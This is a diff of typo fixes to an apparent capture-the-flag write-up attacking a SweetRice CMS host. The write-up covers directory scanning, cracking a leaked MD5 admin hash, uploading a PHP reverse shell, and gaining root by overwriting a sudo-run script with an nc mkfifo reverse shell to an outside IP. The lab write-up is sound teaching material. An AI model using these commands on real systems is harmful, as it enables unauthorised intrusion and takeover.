@@ -20,9 +20,9 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 60
 ```
 
-going to the page is the default apache webpage, nothing much to see, so let's run a gobuster scan to see if we find any hidden directory.
+going to the page is the default Apache webpage, nothing much to see, so let's run a gobuster scan to see if we find any hidden directory.
 
-Im going to use the '-x' flag which adds the extension to the words in the wordlist, but doesn't replace the original words withouth the extension, so naturally it makes the scan slower since it got more words to try, I usually get lucky with only php but if not, you can try with .txt, .pdf, etc. or even .html .htm since some wordlists don't have this extensions by defautl.
+Im going to use the '-x' flag which adds the extension to the words in the wordlist, but doesn't replace the original words without the extension, so naturally it makes the scan slower since it got more words to try, I usually get lucky with only php but if not, you can try with .txt, .pdf, etc. or even .html .htm since some wordlists don't have these extensions by default.
 
 ```terminal
 gobuster dir -u http://10.10.74.238/ -w /usr/share/dirb/wordlists/common.txt -x .php
@@ -41,7 +41,7 @@ gobuster dir -u http://10.10.74.238/ -w /usr/share/dirb/wordlists/common.txt -x 
 /server-status        (Status: 403) [Size: 277]
 ```
 
-we found an directory '/content', heading over the page we see that is a page after the installation of SweetRice which looks like is a CMS like wordpress.
+we found a directory '/content', heading over the page we see that is a page after the installation of SweetRice which looks like a CMS like WordPress.
 
 I'll do another gobuster scan in the background while I search for exploits for this software.
 
@@ -62,9 +62,9 @@ SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Executi | php/webapps/40
 SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload           | php/webapps/14184.txt
 ```
 
-but we don't know whats version is it, so we'd be just trying and see if we're lucky. Im going to try enum the webpage if I found something.
+but we don't know what version is it, so we'd be just trying and see if we're lucky. Im going to try enum the webpage if I found something.
 
-going throung the source code, it looks like I found a version, in /content/js/SweetRice.js there is this comment at the start of the code:
+going through the source code, it looks like I found a version, in /content/js/SweetRice.js there is this comment at the start of the code:
 ```
 /**
  * SweetRice javascript function.
@@ -76,7 +76,7 @@ going throung the source code, it looks like I found a version, in /content/js/S
 <!--
 ```
 
-if im not mistaken and that's the version, it's a pretty old one.
+if I'm not mistaken and that's the version, it's a pretty old one.
 the gobuster scan also finished
 
 ```
@@ -91,19 +91,19 @@ the gobuster scan also finished
 
 *as is a login page
 
-we have the folder attachment that may be the folder were files are uploaded, and we have the "SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload " exploit so i think thats our chance.
+we have the folder attachment that may be the folder where files are uploaded, and we have the "SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload " exploit so I think that's our chance.
 
-after taking a more close look, this doesn't work for us because it uses a plugin 'FCKeditor' which it's not installed here, we can check it going to 'http://10.10.74.238/content/_plugin/'.
+after taking a more close look, this doesn't work for us because it uses a plugin 'FCKeditor' which it's not installed here, we can check it by going to 'http://10.10.74.238/content/_plugin/'.
 
-then i tried the two exploits above, that didn't worked for me also, then I tried the 'Backup Disclosure' which says that there a directory with a mysql backup, I downloaded looking for credentials or something, and I think I found a user and a password:
+then I tried the two exploits above, which didn't work for me also, then I tried the 'Backup Disclosure' which says that there is a directory with a MySQL backup, I downloaded looking for credentials or something, and I think I found a user and a password:
 
 '''
 \\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
 '''
 
-looks like manager is the admin and his password is that hash, so i use hash-identifier to see what kind of hash is a it's looks like is MD5, now with this let's use hashcat to crack it up.
+looks like manager is the admin and his password is that hash, so I use hash-identifier to see what kind of hash is, it looks like is MD5, now with this let's use hashcat to crack it up.
 
-with the normal mode it did not cracked it, so i'll use the rockyou wordlists.
+with the normal mode, it did not cracked it, so I'll use the rockyou wordlists.
 
 * -m 0 is the mode for MD5 raw
 * -a 0 is to use a wordlist
@@ -112,13 +112,13 @@ with the normal mode it did not cracked it, so i'll use the rockyou wordlists.
 hashcat -m 0 -a 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
 ```
 
-and it does crack it to 'Password123', now with this credentials we can access the login page under /content/as. 
+and it does crack it to 'Password123', now with these credentials we can access the login page under /content/as. 
 
-my initial thought in the admin panel was upload a revershell, to somewhere or execute it somehow. I first started creating a post and putting the raw code from a php reverseshell and then execute it, but it did't work (also you have to mark the website status as running to see the posts you create), then i tried to upload the shell to the section that said upload files a bit exceptical because i thought of this only going to display the file to download it, but it actually runs it when you click it, so I got a shell!
+my initial thought in the admin panel was to upload a revershell, to somewhere or execute it somehow. I first started creating a post and putting the raw code from a php reverse shell and then executing it, but it didn't work (also you have to mark the website status as running to see the posts you create), then I tried to upload the shell to the section that said upload files a bit skeptical because I thought of this only going to display the file to download it, but it actually runs it when you click it, so I got a shell!
 
-the php shell: https://raw.githubusercontent.com/jivoi/pentest/master/shell/rshell.php
+the PHP shell: https://raw.githubusercontent.com/jivoi/pentest/master/shell/rshell.php
 (change the IP to yours and the port you'd like)
-(remeber to have a listener with the reverseshell file port when executing the shell)
+(remember to have a listener with the reverse shell file port when executing the shell)
 
 under the itguy's home directory is our first flag
 
@@ -132,7 +132,7 @@ Let's do some enumeration on the machine, we have mysql_login.txt with some cred
 rice:randompass
 ```
 
-we have permissions to execute a file in itguy's home directory
+we have permission to execute a file in itguy's home directory
 
 ```
 (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
@@ -150,7 +150,7 @@ let's see what's copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.26.231 5554 >/tmp/f
 ```
 
-it's a bash reverseshell, let's check if we have permissions to write on it
+it's a bash reverse shell, let's check if we have permission to write on it
 
 ```terminal
 ls -la /etc/copy.sh
@@ -165,14 +165,14 @@ so let's change the IP for ours, but nano isn't working, so i'll do it with echo
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.26.231 5554 >/tmp/f" > /etc/copy.sh
 ```
 
-and now we execute it with sudo, so we'll have a root shell (remember have the listener ready with the correct port, this case 5554)
+and now we execute it with sudo, so we'll have a root shell (remember to have the listener ready with the correct port, this case 5554)
 
 in your local machine:
 ```terminal
 nc -lvnp 5554
 ```
 
-in the victims machine:
+in the victim's machine:
 ```terminal
 sudo /usr/bin/perl /home/itguy/backup.pl
 ```
